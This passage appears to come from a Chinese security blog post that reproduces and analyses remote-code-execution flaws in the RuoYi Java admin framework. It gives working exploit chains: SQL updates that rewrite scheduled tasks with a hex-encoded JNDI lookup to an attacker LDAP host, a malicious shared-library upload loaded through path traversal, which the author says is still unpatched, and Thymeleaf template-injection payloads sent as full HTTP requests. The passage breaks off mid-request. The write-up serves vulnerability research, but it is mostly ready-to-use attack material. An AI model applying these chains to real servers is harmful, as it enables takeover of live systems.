<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755309047416-0915e334-d1bc-405a-8f3c-1ca729640f7b.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755309067494-fb5e97cc-88e1-42a0-a91f-97fa2a72ec2d.png" srcset="/img/loading.gif" lazyload></p>
<p>通过<code>/monitor/job/list</code>接口可以查看<code>jobId</code>，这个是为了后面写 sql 语句实现定点修改；</p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755309098278-3524e6c2-9d18-4cf5-ab68-a1d32909a5ce.png" srcset="/img/loading.gif" lazyload></p>
<p>在新建一个执行 sql 语句的定时任务；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&quot;update sys_job set invoke_target=javax.naming.InitialContext.lookup(&#x27;ldap://xx.xx.xxx.xx:1389/Basic/Command/calc.exe&#x27;) where job_id = 102;&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>由于定时任务执行目标对<code>ldap(s)</code>进行了过滤，因为需要通过 16 进制<code>invoke_target</code>的值进行绕过</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&quot;update sys_job set invoke_target=0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F78782E78782E7878782E78783A313338392F42617369632F436F6D6D616E642F63616C632E6578652729 where job_id = 102;&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755309690818-abaec647-ccba-4478-a324-8bc827355c08.png" srcset="/img/loading.gif" lazyload></p>
<p>执行一次对应的定时任务；</p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755309793968-7605ef3a-932f-43a4-8e60-701a1150ddd1.png" srcset="/img/loading.gif" lazyload></p>
<p>可以发现<code>103</code>编号的任务变成了刚才设置的值，然后就是利用 ldap 协议 rce 了；</p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755309832016-d74fb49c-0588-44cc-b735-543ad8a65e71.png" srcset="/img/loading.gif" lazyload></p>
<p>执行一次以后即可发现</p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755310066758-8a424bd7-7ed1-49ec-8ff3-52159a3b75c9.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="漏洞分析-14"><a href="#漏洞分析-14" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先阅读 4.1 小节的漏洞分析，了解定时任务的执行流程；</p>
<p>这个漏洞的原理就是利用了一个方法执行 sql 预取去修改数据库中存储的定时任务的内容，由于 sql 语句是支持 16 进制内容的，因此可以使用 16 进制绕过关键词过滤内容，实现定时任务修改，然后执行任务定时任务导致 rce。</p>
<p>这个漏洞利用了一下<code>/tool/gen/createTable</code>接口的 sql 注入漏洞，非直接利用，而是调用了其中的 Mybatis 服务方法；</p>
<p><code>/RuoYi-4.7.8/ruoyi-generator/src/main/resources/mapper/generator/GenTableMapper.xml</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;update id=<span class="hljs-string">&quot;createTable&quot;</span>&gt;<br>       $&#123;sql&#125;<br>&lt;/update&gt;<br></code></pre></td></tr></table></figure>

<p>对应的调用方法位于<code>/RuoYi-4.7.8/ruoyi-generator/src/main/java/com/ruoyi/generator/service/impl/GenTableServiceImpl.java</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 创建表</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> sql 创建表语句</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> 结果</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">createTable</span><span class="hljs-params">(String sql)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> genTableMapper.createTable(sql) == <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>根据这个语句方法就可以实现对任意的 sql 语句的调用，因此就能够实现对数据库内容的更改<code>UPDATE</code>；</p>
<p>因此我们调用这个方法的 bean 对象对数据库中的定时任务内容进行修改即可实现任意函数调用 RCE</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&quot;update sys_job set invoke_target=javax.naming.InitialContext.lookup(&#x27;ldap://xx.xx.xxx.xx:1389/Basic/Command/calc.exe&#x27;) where job_id = 102;&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>由于若依本身已经存在了对<code>ldap</code>的过滤，对于<code>invoke_target</code>设置的值采用 16 进制 bypass，因为 sql 语句本身是执行 16 进制的，因此不会对设置内容产生影响；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&quot;update sys_job set invoke_target=0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F78782E78782E7878782E78783A313338392F42617369632F436F6D6D616E642F63616C632E6578652729 where job_id = 102;&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>因此，我们可以将定时任务的执行目标修改为任意内容；</p>
<h2 id="4-5-定时任务-RCE-bypass4（未修复）"><a href="#4-5-定时任务-RCE-bypass4（未修复）" class="headerlink" title="4.5 定时任务 RCE bypass4（未修复）"></a>4.5 定时任务 RCE bypass4（未修复）</h2><blockquote>
<p>截止到漏洞分析时间：该漏洞在最新版本 ruoyi V4.8.1 中仍未修复</p>
</blockquote>
<h3 id="漏洞复现-15"><a href="#漏洞复现-15" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>本次复现环境为<code>windows11 + jdk8_121 + ruoyi4.8.0</code>，若采用 linux 和 macos 复现，则动态链接库的编写都存在一定差异，届时会给出相应内容；</p>
<p>首先需要制作一个即将被加载的动态链接库</p>
<ul>
<li>windows</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br>BOOL APIENTRY <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HMODULE hModule,</span><br><span class="hljs-params">                      DWORD  ul_reason_for_call,</span><br><span class="hljs-params">                      LPVOID lpReserved)</span> &#123;<br>    <span class="hljs-keyword">if</span> (ul_reason_for_call == DLL_PROCESS_ATTACH) &#123;<br>        system(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -shared -o calc.dll calc.c -Wall<br>x86_64-w64-mingw32-gcc -shared -o calc.dll calc.c -Wall<br></code></pre></td></tr></table></figure>

<ul>
<li>linux</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br>__attribute__((constructor))<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>    system(<span class="hljs-string">&quot;gnome-calculator &amp;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -fPIC -shared -o calc.so calc.c<br></code></pre></td></tr></table></figure>

<ul>
<li>macos</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br>__attribute__((constructor))<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>    system(<span class="hljs-string">&quot;open -a Calculator&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -arch x86_64 -shared -o calc.dylib calc.c<br></code></pre></td></tr></table></figure>

<p>制作完成动态链接库一下，使用若依的文件上传接口<code>&lt;font style=&quot;color:rgb(68, 68, 68);background-color:rgb(245, 245, 245);&quot;&gt;/common/upload&lt;/font&gt;</code>将动态链接库上传到服务端</p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755311736878-4a8a2e8a-4d5f-40a9-bd8c-64546446a250.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755311787974-39ee63e3-4f32-4db1-bfce-a4800a832032.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/common/upload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.9<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----geckoformboundarya01d77708851835ad52282b087ed68e7<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>100346<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.9/demo/form/upload<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=54ba609e-21d6-417b-ae7b-cdc1bc8bad2b<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-pgsql"><span class="hljs-comment">------geckoformboundarya01d77708851835ad52282b087ed68e7</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;com.ruoyi.quartz.task.txt&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: application/octet-stream</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">恶意动态链接库二进制文件</span><br><span class="language-pgsql"><span class="hljs-comment">------geckoformboundarya01d77708851835ad52282b087ed68e7</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileId&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-number">99612</span>_calc.dll</span><br><span class="language-pgsql"><span class="hljs-comment">------geckoformboundarya01d77708851835ad52282b087ed68e7</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;initialPreview&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">[]</span><br><span class="language-pgsql"><span class="hljs-comment">------geckoformboundarya01d77708851835ad52282b087ed68e7</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;initialPreviewConfig&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">[]</span><br><span class="language-pgsql"><span class="hljs-comment">------geckoformboundarya01d77708851835ad52282b087ed68e7</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;initialPreviewThumbTags&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">[]</span><br><span class="language-pgsql"><span class="hljs-comment">------geckoformboundarya01d77708851835ad52282b087ed68e7--</span></span><br></code></pre></td></tr></table></figure>

<p>文件上传成功以后，由于文件后缀过滤的缘故，还需要将文件名修改为动态链接库后缀，<code>linux-&gt;.so</code>、<code>macos-&gt;.dylib</code>、<code>window-&gt;.dll</code>；该操作依旧是通过定时任务实现；</p>
<p>这个文件路径还是需要猜测的，这就是利用的难点？如果猜不到文件上传路径，那都白搭</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">ch.qos.logback.core.rolling.helper.RenameUtil.renameByCopying(&#x27;../upload/upload/2025/08/16/com.ruoyi.quartz.task_20250816103604A001.txt&#x27;,&#x27;../upload/upload/2025/08/16/com.ruoyi.quartz.task_20250816103604A001.dll&#x27;)<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755314445005-b9bdd4f9-591b-466f-8457-202acb519a06.png" srcset="/img/loading.gif" lazyload></p>
<p>设置定时任务<code>com.sun.glass.utils.NativeLibLoader.loadLibrary</code>加载我们上传的动态链接库文件内容</p>
<p>对于这个加载的路径如何选择，loadLibrary 默认在<code>&lt;path to jdk&gt;/jre/bin/</code>路径下搜索，所以需要通过目录穿越找到我们上传的动态链接库文件，这又是一大难点；</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">com.sun.glass.utils.NativeLibLoader.loadLibrary(&quot;../../../../../../../../../../code/Java/RuoYi/upload/upload/2025/08/16/com.ruoyi.quartz.task_20250816103604A001&quot;);<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755314799178-8a8ed285-b809-431e-84c3-d76ef0165a4c.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755314841264-5926c82d-ee8b-42b4-b411-7c44fc3fc22f.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="漏洞分析-15"><a href="#漏洞分析-15" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>怎么说呢？看到漏洞复现的过程的话，漏洞原因应该都蛮清晰了；这是多个漏洞点组合起来的 rce，且还存在路径爆破等问题需要解决，利用难度还挺大的；</p>
<p>该漏洞截至目前仍未修改，所以仍在可利用，但是路径问题缺失是一个大问题；</p>
<p>这里放两篇文章吧（ps：写得挺累的啦，不想写了）</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkyNTYxNDAwNQ==&mid=2247484714&idx=1&sn=19e40a91e637794253c8691d7ffe40c6&poc_token=HOHwn2ijyPdDN9S8Wb-cCbXiXrNrQEgt0m-PxsRJ">【安全研究】若依4.8.0版本计划任务RCE研究</a></p>
<p><a target="_blank" rel="noopener" href="https://www.dalon.top/archives/ruo-yi-ruoyi-4.8.0hou-tai-rce-fu-xian">若依Ruoyi-4.8.0后台RCE（复现）</a></p>
<h1 id="5-SSTI模版注入-RCE"><a href="#5-SSTI模版注入-RCE" class="headerlink" title="5 SSTI模版注入 RCE"></a>5 SSTI模版注入 RCE</h1><h2 id="5-1-注入接口-monitor-cache-getNames（V4-6-1"><a href="#5-1-注入接口-monitor-cache-getNames（V4-6-1" class="headerlink" title="5.1 注入接口/monitor/cache/getNames（V4.6.1&lt;Version&lt;V4.7.2）"></a>5.1 注入接口<code>/monitor/cache/getNames</code>（V4.6.1&lt;Version&lt;V4.7.2）</h2><h3 id="漏洞复现-16"><a href="#漏洞复现-16" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754707935928-0e87f4d1-c276-4a8f-a53f-1c4418845ae2.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754707961762-7dc50c21-8171-460c-baf4-a102017a2130.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">// payload(空格绕过检查)<br>$&#123;T (java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)&#125;<br>// URL编码<br>%24%7b%54%20%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%2e%65%78%65%22%29%7d<br></code></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/monitor/cache/getNames</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.9<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>171<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.9/monitor/cache<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=aa74c322-b8a5-46a4-81d1-66dcf34f5380<br><br><span class="language-llvm">fragment<span class="hljs-operator">=</span><span class="hljs-variable">%24</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%54</span><span class="hljs-variable">%20</span><span class="hljs-variable">%28</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%61</span><span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%52</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%52</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%63</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%63</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%65</span><span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%7</span>d</span><br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708037144-7be1dc16-324e-46e2-95cd-231aa27d2458.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708075775-f4a65bae-978d-4c41-934d-86d1a208586f.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="漏洞分析-16"><a href="#漏洞分析-16" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>详细的Thymeleaf 模版注入原理参考文章 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43263451/article/details/126543803">https://blog.csdn.net/weixin_43263451&#x2F;article&#x2F;details&#x2F;126543803</a></p>
<p>这里简单分析一下漏洞点，通过<code>pom.xml</code>文件分析可以看出若依采用了thymeleaf 模板，后续如果控制器返回视图则采用 thymeleaf 模板进行解析；</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- SpringBoot集成thymeleaf模板 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>可以看到在<code>/monitor/cache/getName</code>接口的处理中返回视图，且<code>fragment</code>是通过参数传入的内容，因此可实现 thymeleaf 模板注入；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;/getNames&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCacheNames</span><span class="hljs-params">(String fragment, ModelMap mmap)</span><br>&#123;<br>    mmap.put(<span class="hljs-string">&quot;cacheNames&quot;</span>, cacheService.getCacheNames());<br>    <span class="hljs-keyword">return</span> prefix + <span class="hljs-string">&quot;/cache::&quot;</span> + fragment;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>由于 thymeleaf 本身存在<font style="color:rgb(77, 77, 77);">检查参数值中是否使用了”T(SomeClass)“或者”new SomeClass”</font></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">$&#123;T(java.lang.Runtime).exec(&#x27;calc&#x27;)&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>3.x 版本后的thymeleaf 的 bypass 方法：<a target="_blank" rel="noopener" href="https://www.qwesec.com/2025/02/thymeleafSSTI.html">https://www.qwesec.com/2025/02/thymeleafSSTI.html</a></p>
</blockquote>
<h2 id="5-2-注入接口-monitor-cache-getKeys（V4-6-1"><a href="#5-2-注入接口-monitor-cache-getKeys（V4-6-1" class="headerlink" title="5.2 注入接口/monitor/cache/getKeys（V4.6.1&lt;Version&lt;V4.7.2）"></a>5.2 注入接口<code>/monitor/cache/getKeys</code>（V4.6.1&lt;Version&lt;V4.7.2）</h2><h3 id="漏洞复现-17"><a href="#漏洞复现-17" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708167988-0f78dd7b-d930-4b57-8cb4-630c79056511.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708183990-0def1c4c-b106-4ba4-ae7e-dfeb325072c7.png" srcset="/img/loading.gif" lazyload></p>
<p>随便设置一个<code>cacheName</code>的值，然后修改<code>fragment</code>的内容为 payload 的 URL 编码即可；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">// payload(空格绕过检查)<br>$&#123;T (java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)&#125;<br>// URL编码<br>%24%7b%54%20%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%2e%65%78%65%22%29%7d<br></code></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/monitor/cache/getKeys</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.9<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>183<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.9<br><span class="hljs-attribute">Connection</span><span 